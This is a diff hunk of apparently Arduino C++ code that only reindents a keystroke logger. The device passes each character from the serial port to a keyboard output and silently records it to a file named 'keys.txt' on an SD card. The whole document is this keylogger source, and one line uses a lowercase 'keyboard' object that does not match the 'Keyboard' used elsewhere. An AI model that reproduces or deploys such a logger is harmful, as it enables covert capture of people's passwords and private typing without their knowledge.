@@ -8,20 +8,20 @@ const int  chip = 10
 File keylogs
 
 void setup() {
-	keyboard.begin();
+  keyboard.begin();
 
-	if(SD.begin(chip)) {
-		keylogs = SD.open("keys.txt", FILE_WRITE);
-	}
+  if(SD.begin(chip)) {
+	keylogs = SD.open("keys.txt", FILE_WRITE);
+  }
 }
 
 void loop() {
-	if(Serial.available() > 0) {
-		char keyPress = Serial.read();
-		Keyboard.write(keyPress);
+  if(Serial.available() > 0) {
+	  char keyPress = Serial.read();
+	  Keyboard.write(keyPress);
 	
-		if(keylogs) {
-			keylogs.print(keyPress);
-		}
-	}
+	  if(keylogs) {
+		  keylogs.print(keyPress);
+	  }
+  }
 }
